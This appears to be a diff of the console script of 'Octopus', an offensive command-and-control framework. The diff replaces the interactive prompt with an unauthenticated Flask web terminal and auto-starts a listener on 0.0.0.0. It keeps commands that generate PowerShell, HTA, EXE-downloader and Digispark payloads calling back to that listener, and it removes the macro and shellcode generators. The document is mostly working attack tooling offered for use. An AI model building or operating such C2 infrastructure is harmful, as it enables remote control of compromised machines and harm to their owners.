@@ -1,4 +1,8 @@
-#!/usr/bin/python3
+#!/usr/bin/python
+import sys,io
+# old_stdout = sys.stdout
+# stdout = io.StringIO()
+# sys.stdout = stdout
 
 import threading
 import readline
@@ -10,7 +14,97 @@ import signal
 from termcolor import colored
 from core.functions import *
 from core.weblistener import *
-from flask import *
+#from flask import *
+@app.route("/webinterface", methods=["POST","GET"])
+def panel():
+    if request.method == 'POST':
+        old_stdout = sys.stdout
+        stdout = io.StringIO()
+        sys.stdout = stdout
+        input = request.form["input"]
+        output = run(input)
+        stdout_str = stdout.getvalue()
+        return stdout_str
+    else:
+        return """
+        <!doctype html>
+        <html>
+            <head>
+                <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@4.5.0/css/xterm.css" />
+                <script src="https://cdn.jsdelivr.net/npm/xterm@4.5.0/lib/xterm.js"></script> 
+                <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.3.0/lib/xterm-addon-fit.js"></script>             </head>
+            <body>
+                <div id="terminal"></div>
+                <script>
+                    
+                    const term = new Terminal(),
+                    f = new FitAddon.FitAddon();
+                    term.loadAddon(f);
+                    term.open(document.getElementById('terminal'));
+
+                    const width = window.innerWidth - 230;
+                    const height = window.innerHeight - 140;
+                    cols = parseInt(width / 9, 10);
+                    //term.fit();
+                    term.resize(cols, parseInt(height / 17, 10));
+                    term.scrollToBottom();
+
+                    var prev_line = '';
+
+                    function runFakeTerminal() {
+                        if (term._initialized) {
+                            return;
+                        }
+                        term._initialized = true;
+                        term.prompt = () => {
+                            term.write('\\r\\n\\x1b[4mOctopus\\x1b[0m\\x1b[32m >>\\x1b[0m ');
+                        };
+                        prompt(term);
+                        var buff = Array()
+                        term.onData(e => {
+                            switch (e) {
+                                case '\\r':
+                                    var command = buff.join("")
+                                    loadAndWrite(command)
+                                    buff.length = 0;
+                                case '\\u0003':
+                                    prompt(term);
+                                    break;
+                                case '\\u007F':
+                                    if (term._core.buffer.x > 11) {
+                                        buff.pop()
+                                        term.write('\\b \\b');
+                                    }
+                                    break;
+                                default:
+                                    term.write(e);
+                                    buff.push(e)
+                            }
+                        })
+                    }
+
+                    function loadAndWrite(command) {
+                        prev_line = command
+                        var formData = new FormData();
+                        formData.append("input", command)
+                        fetch(window.location.href, {
+                            method: "POST",
+                            body: formData,
+                        }).then((response) => {
+                            response.text()
+                                .then( raw => raw.replace(/\\n/g, '\\n\\r') )
+                                .then( data => term.write(data) )  
+                        })
+                    }
+
+                    function prompt(term) {
+                        term.write('\\r\\n\\x1b[4mOctopus\\x1b[0m\\x1b[32m >>\\x1b[0m ');
+                    }
+                    runFakeTerminal();
+                </script>
+            </body>
+        </html>
+        """
 from profile import *
 import logging
 
@@ -21,6 +115,7 @@ if python_version != 3:
     print(colored("[-] Please run Octopus with python 3", "red"))
     sys.exit()
 
+listener = NewListener("startup","0.0.0.0",os.environ["PORT"], "0.0.0.0","1","r");listener.start_listener();listener.create_path();listeners=listener
 
 listeners=NewListener()
 def ctrlc(sig, frame):
@@ -34,13 +129,12 @@ else:
 
 banner()
 
-while True:
-
-    readline.set_completer(completer)
-    readline.parse_and_bind("tab: complete")
-    readline.write_history_file(".oct_history")
+def run(command):
+    # readline.set_completer(completer)
+    # readline.parse_and_bind("tab: complete")
+    # readline.write_history_file(".oct_history")
     try:
-        command = input("\033[4mOctopus\033[0m"+colored(" >>", "green"))
+        #command = input("\033[4mOctopus\033[0m"+colored(" >>", "green"))
         # readline.write_history_file(".console_history.oct")
         if command == "list":
             list_sessions()
@@ -60,8 +154,8 @@ while True:
                 session = connections_information[int(command.split(" ")[1])]
                 delete(session[2], int(command.split(" ")[1]))
             except:
-                print(colored("[-] Wrong session selected !", "red"))
-                continue
+                print(colored("[-] Wrong listener selected !", "red"))
+                pass #continue
 
 
         if command == "clear":
@@ -77,7 +171,7 @@ while True:
                 print(colored("[-] Please select a listener !", "red"))
                 print(colored("Syntax :  generate_powershell listener_name", "green"))
                 print(colored("Example : generate_powershell listener1", "yellow"))
-                continue
+                pass #continue
 
             try:
                 hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
@@ -94,7 +188,7 @@ while True:
                 generate(hostname, path, proto_to_use, interval)
             except KeyError:
                 print(colored("[-] Wrong listener selected !", "red"))
-                continue
+                pass #continue
 
         if command.split(" ")[0] == "delete_listener":
             try:
@@ -108,7 +202,7 @@ while True:
 
             except:
                 print(colored("[-] Wrong listener selected !", "red"))
-                continue
+                pass #continue
 
 
         if command.split(" ")[0] == "generate_hta":
@@ -118,7 +212,7 @@ while True:
                 print(colored("[-] Please select a listener !", "red"))
                 print(colored("Syntax :  generate_hta listener_name", "green"))
                 print(colored("Example : generate_hta listener1", "yellow"))
-                continue
+                pass #continue
 
             try:
                 host_ip = listeners_information[listener][3]
@@ -135,7 +229,7 @@ while True:
                 generate_hta(host_ip,bind_port,proto_to_use)
             except KeyError:
                 print(colored("[-] Wrong listener selected !", "red"))
-                continue
+                pass #continue
 
         if command.split(" ")[0] == "generate_unmanaged_exe":
             try:
@@ -145,7 +239,7 @@ while True:
                 print(colored("[-] Please select a listener and check your options !", "red"))
                 print(colored("Syntax :  generate_unmanaged_exe listener_name output_path", "green"))
                 print(colored("Example : generate_unmanaged_exe listener1 /opt/Octopus/file.exe", "yellow"))
-                continue
+                pass #continue
 
             try:
                 hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
@@ -161,149 +255,7 @@ while True:
                 generate_exe_powershell_downloader(hostname, path, proto_to_use, exe_path)
             except KeyError:
                 print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-#generate_unicorn_macro
-
-        if command.split(" ")[0] == "generate_unicorn_macro":
-            try:
-                listener = command.split(" ")[1]
-                vba_path = command.split(" ")[2]
-            except IndexError:
-                print(colored("[-] Please select a listener and check your options !", "red"))
-                print(colored("Syntax :  generate_unicorn_macro listener_name output_path", "green"))
-                print(colored("Example : generate_unicorn_macro listener1 output_path", "yellow"))
-                continue
-
-            try:
-                hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
-                path = listeners_information[listener][5]
-                proto = listeners_information[listener][6]
-                interval = listeners_information[listener][4]
-
-                # check if protocol is True then https is used
-                if proto:
-                    proto_to_use = "https"
-                else:
-                    proto_to_use = "http"
-
-                generate_unicorn_macro(hostname, path, interval, proto_to_use, vba_path)
-            except KeyError:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-
-#generate_spoofed_args_exe
-
-        if command.split(" ")[0] == "generate_spoofed_args_exe":
-            try:
-                listener = command.split(" ")[1]
-                exe_path = command.split(" ")[2]
-            except IndexError:
-                print(colored("[-] Please select a listener and check your options !", "red"))
-                print(colored("Syntax :  generate_spoofed_args_exe listener_name output_path", "green"))
-                print(colored("Example : generate_spoofed_args_exe listener1 /opt/Octopus/file.exe", "yellow"))
-                continue
-
-            try:
-                hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
-                path = listeners_information[listener][5]
-                proto = listeners_information[listener][6]
-
-                # check if protocol is True then https is used
-                if proto:
-                    proto_to_use = "https"
-                else:
-                    proto_to_use = "http"
-
-                generate_spoofed_args_exe(hostname, path, proto_to_use, exe_path)
-            except KeyError:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-
-        if command.split(" ")[0] == "generate_macro":
-            try:
-                listener = command.split(" ")[1]
-                exe_path = command.split(" ")[2]
-            except IndexError:
-                print(colored("[-] Please select a listener and check your options !", "red"))
-                print(colored("Syntax :  generate_macro listener_name output_path", "green"))
-                print(colored("Example : generate_macro listener1 /opt/Octopus/file.macro", "yellow"))
-                continue
-
-            try:
-                hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
-                path = listeners_information[listener][5]
-                proto = listeners_information[listener][6]
-
-                # check if protocol is True then https is used
-                if proto:
-                    proto_to_use = "https"
-                else:
-                    proto_to_use = "http"
-
-                generate_macro(hostname, path, proto_to_use, exe_path)
-            except KeyError:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-# shellcode
-
-        if command.split(" ")[0] == "generate_x86_shellcode":
-            try:
-                listener = command.split(" ")[1]
-            except IndexError:
-                print(colored("[-] Please select a listener and check your options !", "red"))
-                print(colored("Syntax :  generate_x86_shellcode listener_name", "green"))
-                print(colored("Example : generate_x86_shellcode listener1", "yellow"))
-                continue
-
-            try:
-                hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
-                path = listeners_information[listener][5]
-                proto = listeners_information[listener][6]
-
-                # check if protocol is True then https is used
-                if proto:
-                    proto_to_use = "https"
-                else:
-                    proto_to_use = "http"
-
-                generate_x86_shellcode(hostname, path, proto_to_use)
-            except KeyError:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-
-# shellcode x64
-
-        if command.split(" ")[0] == "generate_x64_shellcode":
-            try:
-                listener = command.split(" ")[1]
-            except IndexError:
-                print(colored("[-] Please select a listener and check your options !", "red"))
-                print(colored("Syntax :  generate_x64_shellcode listener_name", "green"))
-                print(colored("Example : generate_x64_shellcode listener1", "yellow"))
-                continue
-
-            try:
-                hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
-                path = listeners_information[listener][5]
-                proto = listeners_information[listener][6]
-
-                # check if protocol is True then https is used
-                if proto:
-                    proto_to_use = "https"
-                else:
-                    proto_to_use = "http"
-
-                generate_x64_shellcode(hostname, path, proto_to_use)
-            except KeyError:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-
+                pass #continue
 
 # generate_digispark
         if command.split(" ")[0] == "generate_digispark":
@@ -314,7 +266,7 @@ while True:
                 print(colored("[-] Please select a listener and check your options !", "red"))
                 print(colored("Syntax :  generate_digispark listener_name output_path", "green"))
                 print(colored("Example : generate_digispark listener1 /opt/Octopus/file.ino", "yellow"))
-                continue
+                pass #continue
 
             try:
                 hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
@@ -330,7 +282,7 @@ while True:
                 generate_digispark(hostname, path, proto_to_use, ino_path)
             except KeyError:
                 print(colored("[-] Wrong listener selected !", "red"))
-                continue
+                pass #continue
 
 
         if command.split(" ")[0] == "interact":
@@ -341,12 +293,12 @@ while True:
                     session = connections_information[int(command.split(" ")[1])]
                 except:
                     print(colored("[-] Error interacting with host", "red"))
-                    continue
+                    pass #continue
                 while True:
                     try:
                         scommand = input("(%s) >> " % colored(session[2], "red"))
                         if scommand == "":
-                            continue
+                            pass #continue
                         elif scommand == "exit" or scommand == "back":
                             break
                         elif scommand == "help":
@@ -389,13 +341,13 @@ while True:
                     port = int(command.split(" ")[2])
                 except ValueError:
                     print(colored("[-] port should be number !", "red"))
-                    continue
+                    pass #continue
                 host = command.split(" ")[3]
                 try:
                     interval = int(command.split(" ")[4])
                 except ValueError:
                     print(colored("[-] interval should be number !", "red"))
-                    continue
+                    pass #continue
                 path = command.split(" ")[5]
                 listener_name = command.split(" ")[6]
                 if check_listener_name(listener_name):
@@ -431,7 +383,7 @@ while True:
                 print(colored("Example (without domain) : listen_http 0.0.0.0 8080 172.0.1.3 5 profile.php op1_listener", "yellow"))
                 http_help_banner()
 
-                continue
+                pass #continue
 
         elif command.split(" ")[0] == "listen_https":
             try:
@@ -441,13 +393,13 @@ while True:
                     port = int(command.split(" ")[2])
                 except ValueError:
                     print(colored("[-] port should be number !", "red"))
-                    continue
+                    pass #continue
                 host = command.split(" ")[3]
                 try:
                     interval = int(command.split(" ")[4])
                 except ValueError:
                     print(colored("[-] interval should be number !", "red"))
-                    continue
+                    pass #continue
                 path = command.split(" ")[5]
                 listener_name = command.split(" ")[6]
                 if check_listener_name(listener_name):
@@ -479,6 +431,8 @@ while True:
                 print(colored("[-] Please check listener arguments !", "red"))
                 print(colored("Syntax  : listen_https BindIP BindPort hostname interval URL listener_name certficate_path key_path", "green"))
                 print(colored("Example (with domain) : listen_https 0.0.0.0 443 myc2.live 5 login.php op1_listener certs/cert.pem certs/key.pem", "yellow"))
-                continue
+                pass #continue
     except EOFError:
         print(" ")
+
+while 1:pass
